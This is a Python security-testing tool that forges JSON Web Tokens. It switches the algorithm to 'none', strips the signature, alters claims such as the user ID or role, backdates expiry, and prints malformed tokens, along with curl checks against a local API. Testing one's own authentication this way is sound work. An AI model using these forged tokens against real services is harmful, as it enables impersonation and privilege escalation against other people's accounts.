#!/usr/bin/env python3
"""
JWT Manipulation Tool for Security Testing

Capabilities:
- Decode JWT without verification
- Change algorithm to 'none' (remove signature)
- Modify claims (sub, role, exp, etc.)
- Re-sign with custom keys
- Create malformed tokens

Usage:
    python jwt-tool.py decode <token>
    python jwt-tool.py none-attack <token>
    python jwt-tool.py modify <token> --claim sub=evil-user
    python jwt-tool.py expired <token>
"""

import sys
import json
import base64
import hmac
import hashlib
from datetime import datetime, timedelta
from typing import Dict, Any


def base64url_decode(input_str: str) -> bytes:
    """Decode base64url string"""
    # Add padding if needed
    padding = 4 - len(input_str) % 4
    if padding != 4:
        input_str += '=' * padding
    return base64.urlsafe_b64decode(input_str)


def base64url_encode(input_bytes: bytes) -> str:
    """Encode to base64url string (no padding)"""
    return base64.urlsafe_b64encode(input_bytes).decode('utf-8').rstrip('=')


def decode_jwt(token: str) -> Dict[str, Any]:
    """Decode JWT without verification"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format (expected 3 parts)")
        
        header = json.loads(base64url_decode(parts[0]))
        payload = json.loads(base64url_decode(parts[1]))
        signature = parts[2]
        
        return {
            'header': header,
            'payload': payload,
            'signature': signature,
            'raw_parts': parts
        }
    except Exception as e:
        print(f"❌ Error decoding JWT: {e}", file=sys.stderr)
        sys.exit(1)


def print_jwt_info(decoded: Dict[str, Any]):
    """Pretty print JWT information"""
    print("\n🔍 JWT Analysis")
    print("=" * 60)
    
    print("\n📋 Header:")
    print(json.dumps(decoded['header'], indent=2))
    
    print("\n📋 Payload:")
    payload = decoded['payload']
    print(json.dumps(payload, indent=2))
    
    # Check expiration
    if 'exp' in payload:
        exp_time = datetime.fromtimestamp(payload['exp'])
        now = datetime.now()
        if exp_time < now:
            print(f"\n⏰ Token EXPIRED: {exp_time} (expired {now - exp_time} ago)")
        else:
            print(f"\n⏰ Token valid until: {exp_time} ({exp_time - now} remaining)")
    
    print("\n🔒 Signature:")
    print(f"   {decoded['signature'][:50]}...")
    print("=" * 60)


def none_algorithm_attack(token: str) -> str:
    """
    The 'none' Algorithm Attack
    
    Changes JWT algorithm to 'none' and removes signature.
    If backend accepts, it means JWT validation is broken.
    
    Attack Vector:
    - Some JWT libraries accept algorithm 'none' 
    - This means token has NO signature
    - Attacker can create any token with any claims
    
    This should ALWAYS fail on secure systems.
    """
    decoded = decode_jwt(token)
    
    # Modify header to use 'none' algorithm
    header = decoded['header']
    original_alg = header.get('alg', 'unknown')
    header['alg'] = 'none'
    
    # Keep payload as-is
    payload = decoded['payload']
    
    # Encode header and payload
    header_b64 = base64url_encode(json.dumps(header).encode('utf-8'))
    payload_b64 = base64url_encode(json.dumps(payload).encode('utf-8'))
    
    # Create token with NO signature (empty string after second dot)
    malicious_token = f"{header_b64}.{payload_b64}."
    
    print("\n🚨 NONE ALGORITHM ATTACK")
    print("=" * 60)
    print(f"Original algorithm: {original_alg}")
    print(f"Modified algorithm: none")
    print("\n⚠️  Malicious Token (NO SIGNATURE):")
    print(malicious_token)
    print("\n📝 Test this token against your API:")
    print(f'   curl -H "Authorization: Bearer {malicious_token}" \\')
    print(f'        http://localhost:8000/accounts/my-accounts')
    print("\n✅ Expected: 401 Unauthorized (token rejected)")
    print("❌ Vulnerable if: Returns account data")
    print("=" * 60)
    
    return malicious_token


def modify_claim(token: str, claim_name: str, claim_value: str) -> str:
    """
    Modify JWT claim and remove signature
    
    Common attacks:
    - Change 'sub' (user ID) to impersonate another user
    - Change 'role' to escalate privileges
    - Extend 'exp' (expiration) to keep token valid longer
    """
    decoded = decode_jwt(token)
    
    # Modify the claim
    payload = decoded['payload']
    original_value = payload.get(claim_name, '(not set)')
    
    # Parse value (handle JSON types)
    try:
        if claim_value.isdigit():
            payload[claim_name] = int(claim_value)
        elif claim_value.lower() == 'true':
            payload[claim_name] = True
        elif claim_value.lower() == 'false':
            payload[claim_name] = False
        elif claim_value.startswith('[') or claim_value.startswith('{'):
            payload[claim_name] = json.loads(claim_value)
        else:
            payload[claim_name] = claim_value
    except:
        payload[claim_name] = claim_value
    
    # Change algorithm to 'none'
    header = decoded['header']
    header['alg'] = 'none'
    
    # Encode
    header_b64 = base64url_encode(json.dumps(header).encode('utf-8'))
    payload_b64 = base64url_encode(json.dumps(payload).encode('utf-8'))
    malicious_token = f"{header_b64}.{payload_b64}."
    
    print("\n🎭 CLAIM MODIFICATION ATTACK")
    print("=" * 60)
    print(f"Claim: {claim_name}")
    print(f"Original: {original_value}")
    print(f"Modified: {claim_value}")
    print(f"\n⚠️  Malicious Token:")
    print(malicious_token)
    print("\n✅ Expected: 401 Unauthorized")
    print("❌ Vulnerable if: Accepts modified claim")
    print("=" * 60)
    
    return malicious_token


def expired_token_test(token: str) -> str:
    """
    Set token expiration to past date
    
    Tests if backend properly validates 'exp' claim
    """
    decoded = decode_jwt(token)
    
    payload = decoded['payload']
    
    # Set expiration to 1 hour ago
    past_time = datetime.now() - timedelta(hours=1)
    payload['exp'] = int(past_time.timestamp())
    
    # Change to 'none' algorithm
    header = decoded['header']
    header['alg'] = 'none'
    
    # Encode
    header_b64 = base64url_encode(json.dumps(header).encode('utf-8'))
    payload_b64 = base64url_encode(json.dumps(payload).encode('utf-8'))
    expired_token = f"{header_b64}.{payload_b64}."
    
    print("\n⏰ EXPIRED TOKEN TEST")
    print("=" * 60)
    print(f"Token expiration set to: {past_time}")
    print(f"Current time: {datetime.now()}")
    print(f"\n⚠️  Expired Token:")
    print(expired_token)
    print("\n✅ Expected: 401 Unauthorized (token expired)")
    print("❌ Vulnerable if: Accepts expired token")
    print("=" * 60)
    
    return expired_token


def malformed_token_test():
    """Generate various malformed tokens"""
    tests = [
        ("Missing signature", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlciJ9"),
        ("Extra dots", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlciJ9.signature.extra"),
        ("Invalid base64", "not.valid.base64!!!"),
        ("Empty parts", ".."),
        ("Only header", "eyJhbGciOiJIUzI1NiJ9"),
    ]
    
    print("\n🔨 MALFORMED TOKEN TESTS")
    print("=" * 60)
    for name, token in tests:
        print(f"\n{name}:")
        print(f"   {token}")
    print("\n✅ Expected: All should return 401 Unauthorized")
    print("❌ Vulnerable if: Any return 200 or 500")
    print("=" * 60)


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    
    command = sys.argv[1]
    
    if command == "decode":
        if len(sys.argv) < 3:
            print("Usage: jwt-tool.py decode <token>")
            sys.exit(1)
        token = sys.argv[2]
        decoded = decode_jwt(token)
        print_jwt_info(decoded)
    
    elif command == "none-attack":
        if len(sys.argv) < 3:
            print("Usage: jwt-tool.py none-attack <token>")
            sys.exit(1)
        token = sys.argv[2]
        none_algorithm_attack(token)
    
    elif command == "modify":
        if len(sys.argv) < 4:
            print("Usage: jwt-tool.py modify <token> --claim <name>=<value>")
            sys.exit(1)
        token = sys.argv[2]
        if sys.argv[3] != "--claim":
            print("Error: Expected --claim flag")
            sys.exit(1)
        if len(sys.argv) < 5 or '=' not in sys.argv[4]:
            print("Error: Claim must be in format name=value")
            sys.exit(1)
        claim_name, claim_value = sys.argv[4].split('=', 1)
        modify_claim(token, claim_name, claim_value)
    
    elif command == "expired":
        if len(sys.argv) < 3:
            print("Usage: jwt-tool.py expired <token>")
            sys.exit(1)
        token = sys.argv[2]
        expired_token_test(token)
    
    elif command == "malformed":
        malformed_token_test()
    
    else:
        print(f"Unknown command: {command}")
        print(__doc__)
        sys.exit(1)


if __name__ == "__main__":
    main()
